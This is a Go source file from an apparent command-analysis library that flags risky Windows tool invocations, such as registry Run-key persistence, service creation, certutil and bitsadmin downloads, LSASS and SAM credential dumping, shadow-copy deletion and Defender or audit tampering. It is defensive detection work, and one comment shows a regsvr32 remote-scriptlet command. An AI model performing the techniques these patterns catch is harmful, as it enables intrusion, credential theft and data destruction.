package shellx

import "strings"

// Windows native tools. They are registered in the common handler table
// because they are recognised in any dialect: an agent on Windows may reach
// reg.exe through cmd, PowerShell or Git Bash.

func registerWin() {
	register(hReg, "reg")
	register(hSchtasks, "schtasks")
	register(hSc, "sc")
	register(hNet, "net", "net1")
	register(hNetsh, "netsh")
	register(hWevtutil, "wevtutil")
	register(hShadow, "vssadmin", "wbadmin", "bcdedit")
	register(hCertutil, "certutil")
	register(hBitsadmin, "bitsadmin")
	register(hRundll32, "rundll32")
	register(hRegsvr32, "regsvr32")
	register(hMsiexec, "msiexec")
	register(hTaskkill, "taskkill", "tskill")
	register(hWmic, "wmic")
	register(hIcacls, "icacls", "cacls", "takeown", "attrib")
	register(hWinDisk, "cipher", "format", "diskpart", "fsutil")
	register(hAuditpol, "auditpol")
	register(hWinCred, "cmdkey", "vaultcmd", "procdump", "procdump64", "ntdsutil")
	register(hWinRecon, "ipconfig", "systeminfo", "tasklist", "quser", "qwinsta", "nltest", "ver")
	register(hWinDel, "del", "erase", "rd")
	register(hWinCopy, "copy", "xcopy", "robocopy", "move")
	register(hWinType, "type")
	register(hFindstr, "findstr", "dir", "where")
	register(hSetx, "setx")
	register(hMpCmdRun, "mpcmdrun", "dism")
}

// winKey normalises a registry path for matching.
func winKey(k string) string {
	k = strings.ToLower(strings.Trim(k, "\"'"))
	k = strings.ReplaceAll(k, "/", "\\")
	k = strings.TrimPrefix(k, "registry::")
	for _, p := range [][2]string{
		{"hkey_local_machine", "hklm"}, {"hkey_current_user", "hkcu"}, {"hkey_users", "hku"}, {"hkey_classes_root", "hkcr"},
		{"hklm:", "hklm"}, {"hkcu:", "hkcu"}, {"hku:", "hku"}, {"hkcr:", "hkcr"},
	} {
		if strings.HasPrefix(k, p[0]) {
			k = p[1] + k[len(p[0]):]
			break
		}
	}
	return k
}

// regFacts classifies a registry key (and optional value name/data) that is
// being written (write=true) or deleted.
func (a *analyzer) regFacts(key, name, data string, write bool, depth int) {
	k := winKey(key)
	n := strings.ToLower(name)
	d := strings.ToLower(strings.TrimSpace(data))
	switch {
	case strings.Contains(k, `\currentversion\run`) || strings.Contains(k, `\currentversion\policies\explorer\run`) ||
		strings.Contains(k, `\winlogon`) && (n == "userinit" || n == "shell" || n == "" || n == "taskman") ||
		strings.Contains(k, `\image file execution options\`) || strings.Contains(k, `\currentversion\windows`) && (n == "load" || n == "appinit_dlls") ||
		strings.Contains(k, `\active setup\installed components`) || strings.Contains(k, `\environment`) && n == "userinitmprlogonscript" ||
		strings.Contains(k, `\command processor`) && n == "autorun":
		if write {
			a.persist("registry_run")
			if data != "" {
				a.sub(data, detectWinDialect(data), OriginWrapper, depth+1, noFlow())
			}
		}
	}
	if strings.Contains(k, `windows defender`) || strings.Contains(k, `\microsoft antimalware`) || strings.Contains(k, `\windows advanced threat protection`) {
		a.evasion("defender_tamper")
	}
	if strings.Contains(k, `\scriptblocklogging`) || strings.Contains(k, `\modulelogging`) || strings.Contains(k, `\transcription`) ||
		strings.Contains(k, `\eventlog\`) && (n == "start" || !write) || strings.Contains(k, `\wmi\autologger`) {
		if !write || d == "0" || d == "4" || d == "" {
			a.evasion("audit_disable")
		}
	}
	if strings.Contains(k, `\services\`) {
		// Start=4 disables a service; deleting its key removes it.
		svc := k[strings.Index(k, `\services\`)+len(`\services\`):]
		if i := strings.IndexByte(svc, '\\'); i >= 0 {
			svc = svc[:i]
		}
		if !write || n == "start" && d == "4" {
			a.stopTool(svc)
		}
	}
	if strings.Contains(k, `\firewallpolicy\`) && n == "enablefirewall" && d == "0" {
		a.evasion("firewall_disable")
	}
	if isAgentHookPath(strings.ReplaceAll(k, "\\", "/")) {
		a.evasion("agent_hook_tamper")
	}
	if isSensorPath(strings.ReplaceAll(k, "\\", "/")) || strings.Contains(k, `\osquery`) || strings.Contains(k, `\fleetdm`) || strings.Contains(k, `\hawkbell`) {
		a.evasion("sensor_tamper")
	}
}

func hReg(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	if len(rest) < 2 {
		return
	}
	verb := strings.ToLower(rest[0].s)
	key := rest[1].s
	val := func(name string) string {
		// /v NAME, /d DATA, /t TYPE: the value is the next word.
		for i := 2; i+1 < len(rest); i++ {
			if strings.EqualFold(rest[i].s, name) {
				return rest[i+1].s
			}
		}
		return ""
	}
	switch verb {
	case "add":
		a.regFacts(key, val("/v"), val("/d"), true, c.depth)
	case "delete":
		a.regFacts(key, val("/v"), "", false, c.depth)
	case "import", "load", "restore":
		a.read(key)
	case "save", "export":
		k := winKey(key)
		if strings.HasPrefix(k, `hklm\sam`) || strings.HasPrefix(k, `hklm\security`) || strings.HasPrefix(k, `hklm\system`) {
			a.cred("keychain_dump")
		}
		if len(rest) > 2 {
			a.write(rest[2].s)
		}
	case "query":
		for i := 2; i+1 < len(rest); i++ {
			if strings.EqualFold(rest[i].s, "/f") && secretPattern(rest[i+1].s) {
				a.recon("find_secrets")
			}
		}
		k := winKey(key)
		if strings.Contains(k, `\winlogon`) && containsArgFold(rest, "defaultpassword") || strings.Contains(k, `\putty\sessions`) || strings.Contains(k, `\realvnc`) || strings.Contains(k, `\tightvnc`) {
			a.cred("keychain_dump")
		}
	}
}

func hSchtasks(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	create := containsArgFold(rest, "/create") || containsArgFold(rest, "/change")
	for i := 0; i < len(rest); i++ {
		l := strings.ToLower(rest[i].s)
		if create && l == "/tr" && i+1 < len(rest) {
			// The task's command line.
			a.sub(rest[i+1].s, detectWinDialect(rest[i+1].s), OriginWrapper, c.depth+1, noFlow())
		}
		if l == "/s" && i+1 < len(rest) {
			a.host(strings.TrimLeft(rest[i+1].s, "\\"))
		}
		if (containsArgFold(rest, "/delete") || containsArgFold(rest, "/end")) && l == "/tn" && i+1 < len(rest) {
			a.stopTool(rest[i+1].s)
		}
	}
	if create {
		a.persist("scheduled_task")
	}
}

// detectWinDialect picks PowerShell or cmd for a command line known to run
// on Windows.
func detectWinDialect(s string) Dialect {
	if d := detectDialect(s); d != Posix {
		return d
	}
	return Cmd
}

func hSc(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	if len(rest) > 0 && strings.HasPrefix(rest[0].s, "\\\\") {
		a.host(strings.TrimLeft(rest[0].s, "\\"))
		rest = rest[1:]
	}
	if len(rest) < 2 {
		return
	}
	verb, svc := strings.ToLower(rest[0].s), rest[1].s
	switch verb {
	case "stop", "delete", "pause":
		a.stopTool(svc)
	case "config":
		all := strings.ToLower(joinArgs(rest[2:]))
		if strings.Contains(all, "disabled") {
			a.stopTool(svc)
		}
		if i := indexArgFoldPrefix(rest, "binpath="); i >= 0 {
			a.persist("systemd")
			a.sub(scValue(rest, i, "binpath="), Cmd, OriginWrapper, c.depth+1, noFlow())
		}
	case "create":
		// A new Windows service is service-manager persistence.
		a.persist("systemd")
		if i := indexArgFoldPrefix(rest, "binpath="); i >= 0 {
			a.sub(scValue(rest, i, "binpath="), Cmd, OriginWrapper, c.depth+1, noFlow())
		}
	case "sdset", "failure":
		if _, ok := securityTool(svc); ok {
			a.evasion("sensor_tamper")
		}
	}
}

func indexArgFoldPrefix(args []arg, prefix string) int {
	for i := range args {
		if hasPrefixFold(args[i].s, prefix) {
			return i
		}
	}
	return -1
}

// scValue reads sc's "name= value" pair, where the value may be attached or
// the next word.
func scValue(args []arg, i int, prefix string) string {
	v := args[i].s[len(prefix):]
	if v == "" && i+1 < len(args) {
		v = args[i+1].s
	}
	return v
}

func hNet(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	if len(rest) == 0 {
		return
	}
	verb := strings.ToLower(rest[0].s)
	all := " " + strings.ToLower(joinArgs(rest)) + " "
	switch verb {
	case "stop", "pause":
		if len(rest) > 1 {
			a.stopTool(joinArgs(rest[1:]))
			a.stopTool(rest[1].s)
		}
	case "localgroup":
		if strings.Contains(all, " /add ") && (strings.Contains(all, "administrators") || strings.Contains(all, "remote desktop users")) {
			a.priv("sudoers_edit")
		} else if !strings.Contains(all, " /add ") && !strings.Contains(all, " /delete ") {
			a.recon("id")
		}
	case "user", "accounts", "group", "config", "session", "share", "view":
		if !strings.Contains(all, " /add ") && !strings.Contains(all, " /delete ") && !strings.Contains(all, " /active") {
			a.recon("id")
		}
	case "use":
		for _, r := range rest[1:] {
			if strings.HasPrefix(r.s, "\\\\") {
				h := strings.TrimLeft(r.s, "\\")
				if i := strings.IndexAny(h, "\\/"); i >= 0 {
					h = h[:i]
				}
				a.host(h)
			}
		}
	}
}

func hNetsh(a *analyzer, c *simple, in flow, out *flow) {
	all := " " + strings.ToLower(joinArgs(c.rest())) + " "
	switch {
	case strings.Contains(all, "advfirewall") && strings.Contains(all, "state off"),
		strings.Contains(all, "firewall set opmode") && (strings.Contains(all, "disable") || strings.Contains(all, "mode=disable")),
		strings.Contains(all, "advfirewall reset"):
		a.evasion("firewall_disable")
	case strings.Contains(all, "wlan") && strings.Contains(all, "key=clear"):
		a.cred("keychain_dump")
	case strings.Contains(all, "trace start") || strings.Contains(all, "interface portproxy add"):
		// Packet capture and port proxies have no vocabulary entry; the
		// command itself is still listed in Commands.
	}
}

func hWevtutil(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	if len(rest) == 0 {
		return
	}
	switch strings.ToLower(rest[0].s) {
	case "cl", "clear-log":
		a.evasion("log_clear")
	case "sl", "set-log":
		all := strings.ToLower(joinArgs(rest))
		if strings.Contains(all, "/e:false") || strings.Contains(all, "/enabled:false") {
			a.evasion("audit_disable")
		}
	case "um", "uninstall-manifest":
		a.evasion("audit_disable")
	}
}

func hShadow(a *analyzer, c *simple, in flow, out *flow) {
	all := " " + strings.ToLower(joinArgs(c.rest())) + " "
	switch c.name {
	case "vssadmin":
		if strings.Contains(all, " delete shadows") || strings.Contains(all, " resize shadowstorage") {
			a.destructive("shadow_copy_delete")
		}
	case "wbadmin":
		if strings.Contains(all, " delete ") {
			a.destructive("shadow_copy_delete")
		}
	case "bcdedit":
		if strings.Contains(all, "recoveryenabled") && strings.Contains(all, " no") || strings.Contains(all, "ignoreallfailures") {
			a.destructive("shadow_copy_delete")
		}
	}
}

func hCertutil(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	var pos []arg
	urlcache, decode, encode := false, false, false
	for _, r := range rest {
		l := strings.ToLower(r.s)
		if strings.HasPrefix(l, "-") || strings.HasPrefix(l, "/") && len(l) < 20 && !strings.Contains(l[1:], "/") {
			switch strings.TrimLeft(l, "-/") {
			case "urlcache", "verifyctl":
				urlcache = true
			case "decode", "decodehex":
				decode = true
			case "encode", "encodehex":
				encode = true
			}
			continue
		}
		pos = append(pos, r)
	}
	switch {
	case urlcache:
		var u string
		var files []arg
		for _, p := range pos {
			if strings.Contains(p.s, "://") {
				u = p.s
			} else {
				files = append(files, p)
			}
		}
		if u == "" {
			return
		}
		a.f.Downloads = true
		a.url(u)
		if len(files) > 0 {
			a.write(files[0].s)
			a.drop(files[0].s, tDownload)
		} else {
			a.drop(urlBase(u), tDownload)
		}
	case decode && len(pos) >= 2:
		a.read(pos[0].s)
		a.write(pos[1].s)
		t := tB64
		if dt, ok := a.droppedTaint(pos[0].s); ok {
			t |= dt
		}
		a.drop(pos[1].s, t)
	case encode && len(pos) >= 2:
		a.read(pos[0].s)
		a.write(pos[1].s)
	}
}

func hBitsadmin(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	transfer := containsArgFold(rest, "/transfer") || containsArgFold(rest, "/addfile")
	var u string
	for i, r := range rest {
		if strings.Contains(r.s, "://") {
			u = r.s
			if transfer {
				a.f.Downloads = true
				a.url(u)
				if i+1 < len(rest) {
					a.write(rest[i+1].s)
					a.drop(rest[i+1].s, tDownload)
				}
			}
		}
		if strings.EqualFold(r.s, "/setnotifycmdline") && i+2 < len(rest) {
			// The job runs this program when it completes.
			a.runInner(c, rest[i+2:], noFlow(), false, false)
		}
	}
}

func hRundll32(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	if len(rest) == 0 {
		return
	}
	all := joinArgs(rest)
	l := strings.ToLower(all)
	a.interpreter(c.name)
	switch {
	case strings.Contains(l, "javascript:") || strings.Contains(l, "vbscript:"):
		lang := "javascript"
		i := strings.Index(l, "javascript:")
		if i < 0 {
			lang, i = "vbscript", strings.Index(l, "vbscript:")
		}
		code := all[i:]
		a.inline(lang, code)
		a.foreign(lang, code, OriginInlinePrefix+c.name, c.depth+1)
		if strings.Contains(l, "http://") || strings.Contains(l, "https://") {
			a.f.Downloads, a.f.DownloadAndExecute = true, true
		}
	case strings.Contains(l, "comsvcs") && strings.Contains(l, "minidump"), strings.Contains(l, "keymgr.dll"):
		a.cred("keychain_dump")
	case strings.Contains(l, "http://") || strings.Contains(l, "https://") || strings.Contains(l, "\\\\"):
		if strings.Contains(l, "://") {
			a.f.Downloads, a.f.DownloadAndExecute = true, true
		}
	}
	// rundll32 path.dll,Entry: the DLL is the code that runs.
	dll := rest[0].s
	if i := strings.IndexByte(dll, ','); i > 0 {
		dll = dll[:i]
	}
	a.ranFile(dll)
	if strings.Contains(l, "shellexec_rundll") && len(rest) > 1 {
		a.runInner(c, rest[1:], noFlow(), false, false)
	}
}

func hRegsvr32(a *analyzer, c *simple, in flow, out *flow) {
	a.interpreter(c.name)
	for _, r := range c.rest() {
		l := strings.ToLower(r.s)
		if strings.HasPrefix(l, "/i:") || strings.HasPrefix(l, "-i:") {
			v := r.s[3:]
			if strings.Contains(v, "://") {
				// regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll
				a.f.Downloads, a.f.DownloadAndExecute = true, true
				a.url(v)
			} else {
				a.ranFile(v)
			}
			continue
		}
		if !strings.HasPrefix(l, "/") && !strings.HasPrefix(l, "-") {
			a.ranFile(r.s)
		}
	}
}

func hMsiexec(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	for i, r := range rest {
		l := strings.ToLower(r.s)
		switch l {
		case "/i", "-i", "/package", "/a", "/p", "/update":
			if i+1 < len(rest) {
				t := rest[i+1].s
				if strings.Contains(t, "://") {
					a.f.Downloads, a.f.DownloadAndExecute = true, true
					a.url(t)
				} else {
					a.ranFile(t)
				}
			}
		case "/x", "-x", "/uninstall":
			if i+1 < len(rest) {
				a.uninstalled(rest[i+1].s)
			}
		}
	}
}

func hTaskkill(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	for i, r := range rest {
		l := strings.ToLower(r.s)
		if (l == "/im" || l == "-im" || l == "/fi") && i+1 < len(rest) {
			v := rest[i+1].s
			if j := strings.LastIndexByte(v, ' '); j >= 0 {
				v = v[j+1:] // /fi "imagename eq x.exe"
			}
			a.stopTool(v)
		}
	}
	if c.name == "tskill" && len(rest) > 0 {
		a.stopTool(rest[0].s)
	}
}

func hWmic(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	all := joinArgs(rest)
	l := " " + strings.ToLower(all) + " "
	for _, r := range rest {
		if hasPrefixFold(r.s, "/node:") {
			a.host(strings.Trim(r.s[len("/node:"):], "\"'"))
		}
	}
	switch {
	case strings.Contains(l, " shadowcopy ") && strings.Contains(l, " delete"):
		a.destructive("shadow_copy_delete")
	case strings.Contains(l, " process ") && strings.Contains(l, " call create"):
		i := indexFold(all, "create")
		cmd := strings.TrimSpace(all[i+len("create"):])
		cmd = strings.Trim(cmd, "\"'")
		if cmd != "" {
			a.sub(cmd, detectWinDialect(cmd), OriginWrapper, c.depth+1, noFlow())
		}
	case strings.Contains(l, " process ") && (strings.Contains(l, " delete") || strings.Contains(l, " terminate")),
		strings.Contains(l, " service ") && (strings.Contains(l, "stopservice") || strings.Contains(l, "changestartmode") || strings.Contains(l, " delete")):
		for _, w := range strings.FieldsFunc(all, func(r rune) bool { return r == ' ' || r == '=' || r == '"' || r == '\'' || r == '%' }) {
			a.stopTool(w)
		}
	case strings.Contains(l, " product ") && strings.Contains(l, "uninstall"):
		for _, w := range strings.FieldsFunc(all, func(r rune) bool { return r == '=' || r == '"' || r == '\'' || r == '%' }) {
			a.uninstalled(w)
		}
	case strings.Contains(l, " os ") || strings.Contains(l, " computersystem ") || strings.Contains(l, " bios ") || strings.Contains(l, " qfe "):
		a.recon("uname")
	case strings.Contains(l, " useraccount ") || strings.Contains(l, " group "):
		a.recon("id")
	case strings.Contains(l, " process ") && (strings.Contains(l, " list") || strings.Contains(l, " get")):
		a.recon("ps")
	}
}

func hIcacls(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	all := strings.ToLower(joinArgs(rest))
	for _, r := range rest {
		if strings.HasPrefix(r.s, "/") && len(r.s) < 16 || strings.HasPrefix(r.s, "+") || strings.HasPrefix(r.s, "-") || strings.Contains(r.s, ":") && !strings.ContainsAny(r.s, "\\/") {
			continue
		}
		a.attr(r.s)
	}
	if c.name == "icacls" || c.name == "cacls" {
		open := strings.Contains(all, "everyone:") || strings.Contains(all, "users:(f") || strings.Contains(all, "*s-1-1-0:") || strings.Contains(all, "authenticated users:")
		if open && (strings.Contains(all, "/t") || strings.Contains(all, "(oi)(ci)")) && strings.Contains(all, "/grant") {
			a.destructive("chmod_recursive_open")
		}
	}
}

func hWinDisk(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	all := strings.ToLower(joinArgs(rest))
	switch c.name {
	case "cipher":
		if strings.Contains(all, "/w") {
			a.destructive("disk_wipe")
		}
	case "format":
		if c.dialect == Posix {
			return
		}
		for _, r := range rest {
			if len(r.s) == 2 && r.s[1] == ':' {
				a.destructive("mkfs")
			}
		}
	case "diskpart":
		if static, _, has := c.input(a, in); has && static != nil && containsFold(*static, "clean") {
			a.destructive("disk_wipe")
		}
		for i, r := range rest {
			if strings.EqualFold(r.s, "/s") && i+1 < len(rest) {
				a.read(rest[i+1].s)
			}
		}
	case "fsutil":
		if strings.Contains(all, "usn deletejournal") {
			a.evasion("log_clear")
		}
	}
}

func hAuditpol(a *analyzer, c *simple, in flow, out *flow) {
	all := strings.ToLower(joinArgs(c.rest()))
	if strings.Contains(all, "/clear") || strings.Contains(all, "/remove") ||
		strings.Contains(all, "/set") && (strings.Contains(all, ":disable")) {
		a.evasion("audit_disable")
	}
}

func hWinCred(a *analyzer, c *simple, in flow, out *flow) {
	all := strings.ToLower(joinArgs(c.rest()))
	switch c.name {
	case "cmdkey":
		if strings.Contains(all, "/list") {
			a.cred("keychain_dump")
		}
	case "vaultcmd":
		if strings.Contains(all, "/list") {
			a.cred("keychain_dump")
		}
	case "procdump", "procdump64":
		if strings.Contains(all, "lsass") {
			a.cred("keychain_dump")
		}
	case "ntdsutil":
		a.cred("keychain_dump")
	}
}

func hWinRecon(a *analyzer, c *simple, in flow, out *flow) {
	switch c.name {
	case "ipconfig":
		a.recon("ifconfig")
	case "systeminfo", "ver":
		a.recon("uname")
	case "tasklist":
		a.recon("ps")
	case "quser", "qwinsta", "nltest":
		a.recon("id")
	}
}

// winDelete handles del/erase/rd/rmdir/Remove-Item in cmd and PowerShell
// syntax. It reports true when it took the command.
func winDelete(a *analyzer, c *simple) bool {
	rec := false
	var targets []arg
	rest := c.rest()
	for i := 0; i < len(rest); i++ {
		s := rest[i].s
		l := strings.ToLower(s)
		switch {
		case len(l) >= 2 && l[0] == '/' && len(l) <= 3 && !rest[i].quoted:
			if l == "/s" {
				rec = true
			}
		case len(l) >= 2 && l[0] == '-' && !rest[i].quoted:
			name := l[1:]
			val := false
			if j := strings.IndexByte(name, ':'); j > 0 {
				name = name[:j]
				val = true
			}
			switch {
			case psPrefix(name, "recurse", 1), name == "rf", name == "fr", name == "rec":
				rec = true
			case psPrefix(name, "path", 1), psPrefix(name, "literalpath", 1):
				if !val && i+1 < len(rest) {
					targets = append(targets, rest[i+1])
					i++
				}
			case psPrefix(name, "include", 1), psPrefix(name, "exclude", 2), psPrefix(name, "filter", 2), psPrefix(name, "erroraction", 2),
				name == "ea", psPrefix(name, "stream", 1), psPrefix(name, "credential", 2):
				if !val {
					i++
				}
			}
		default:
			targets = append(targets, rest[i])
		}
	}
	for _, t := range targets {
		if t.proc {
			continue
		}
		a.del(t.s)
		if containsFold(t.s, "historysavepath") {
			a.evasion("history_clear")
		}
		if strings.HasPrefix(winKey(t.s), "hk") && strings.Contains(t.s, "\\") {
			a.regFacts(t.s, "", "", false, c.depth)
		}
		if !rec {
			continue
		}
		if cls := rmTargetClass(t); cls != "" {
			a.destructive(cls)
		}
	}
	return true
}

func hWinDel(a *analyzer, c *simple, in flow, out *flow) {
	winDelete(a, c)
}

// winCopyMove handles copy/xcopy/robocopy/move/Copy-Item/Move-Item in cmd and
// PowerShell syntax.
func winCopyMove(a *analyzer, c *simple) bool {
	var pos []arg
	var dest arg
	hasDest := false
	rest := c.rest()
	for i := 0; i < len(rest); i++ {
		s := rest[i].s
		l := strings.ToLower(s)
		switch {
		case len(l) >= 2 && l[0] == '/' && !strings.ContainsAny(l[1:], "/\\") && !rest[i].quoted:
		case len(l) >= 2 && l[0] == '-' && !rest[i].quoted:
			name := l[1:]
			switch {
			case psPrefix(name, "destination", 1):
				if i+1 < len(rest) {
					dest, hasDest = rest[i+1], true
					i++
				}
			case psPrefix(name, "path", 1), psPrefix(name, "literalpath", 1):
				if i+1 < len(rest) {
					pos = append(pos, rest[i+1])
					i++
				}
			case psPrefix(name, "filter", 2), psPrefix(name, "include", 1), psPrefix(name, "exclude", 1), psPrefix(name, "erroraction", 2), name == "ea",
				psPrefix(name, "tosession", 2), psPrefix(name, "fromsession", 2), psPrefix(name, "credential", 2):
				i++
			}
		default:
			pos = append(pos, rest[i])
		}
	}
	if !hasDest && len(pos) >= 2 {
		if c.name == "robocopy" {
			dest, hasDest = pos[1], true
			pos = pos[:1]
		} else {
			dest, hasDest = pos[len(pos)-1], true
			pos = pos[:len(pos)-1]
		}
	}
	move := c.name == "move" || c.name == "mv" || c.name == "mi" || c.name == "move-item"
	var t taint
	for _, s := range pos {
		if strings.EqualFold(s.s, "nul") {
			if hasDest {
				a.destructive("truncate_file") // copy nul file
			}
			continue
		}
		// copy a+b dest concatenates.
		for _, part := range strings.Split(s.s, "+") {
			if part == "" {
				continue
			}
			if move {
				a.use(part, mMove)
			} else {
				a.read(part)
			}
			if dt, ok := a.droppedTaint(part); ok {
				t |= dt
			}
		}
	}
	if hasDest {
		a.write(dest.s)
		if t != 0 {
			a.drop(dest.s, t)
		}
	}
	return true
}

func hWinCopy(a *analyzer, c *simple, in flow, out *flow) {
	winCopyMove(a, c)
}

func hWinType(a *analyzer, c *simple, in flow, out *flow) {
	if c.dialect == Posix {
		return // POSIX "type" is a command lookup
	}
	out.static = nil
	out.t = 0
	for _, p := range c.rest() {
		if strings.HasPrefix(p.s, "-") || strings.EqualFold(p.s, "nul") {
			continue
		}
		a.read(p.s)
		if t, ok := a.droppedTaint(p.s); ok {
			out.t |= t
		}
	}
	if len(c.rest()) == 1 && strings.EqualFold(c.rest()[0].s, "nul") {
		empty := ""
		out.static = &empty
	}
}

func hFindstr(a *analyzer, c *simple, in flow, out *flow) {
	rest := c.rest()
	if c.dialect == Posix && c.name != "findstr" {
		return
	}
	recursive := false
	var pos []arg
	for _, r := range rest {
		l := strings.ToLower(r.s)
		if strings.HasPrefix(l, "/") && len(l) <= 4 {
			if strings.Contains(l, "s") || l == "/r" {
				recursive = true
			}
			continue
		}
		if strings.HasPrefix(l, "/c:") {
			pos = append([]arg{{s: r.s[3:]}}, pos...)
			continue
		}
		pos = append(pos, r)
	}
	switch c.name {
	case "findstr":
		if len(pos) > 0 && recursive && secretPattern(pos[0].s) {
			a.recon("find_secrets")
		}
		for _, p := range pos[min(1, len(pos)):] {
			a.read(p.s)
		}
	default:
		for _, p := range pos {
			if recursive && secretPattern(p.s) {
				a.recon("find_secrets")
			}
			if hasPrefixFold(p.s, "env:") {
				a.recon("env")
				a.cred("env_dump")
			}
		}
	}
}

func hSetx(a *analyzer, c *simple, in flow, out *flow) {
	pos := c.rest()
	if len(pos) >= 2 && !strings.HasPrefix(pos[0].s, "/") {
		a.envAssign(pos[0].s)
	}
}

func hMpCmdRun(a *analyzer, c *simple, in flow, out *flow) {
	all := strings.ToLower(joinArgs(c.rest()))
	switch c.name {
	case "mpcmdrun":
		if strings.Contains(all, "-removedefinitions") || strings.Contains(all, "-disableservice") {
			a.evasion("defender_tamper")
		}
		// MpCmdRun -DownloadFile -url U -path P is a signed downloader.
		if strings.Contains(all, "-downloadfile") {
			a.f.Downloads = true
			rest := c.rest()
			for i, r := range rest {
				if strings.EqualFold(r.s, "-path") && i+1 < len(rest) {
					a.write(rest[i+1].s)
					a.drop(rest[i+1].s, tDownload)
				}
			}
		}
	case "dism":
		if strings.Contains(all, "/disable-feature") && strings.Contains(all, "defender") {
			a.evasion("defender_tamper")
		}
	}
}
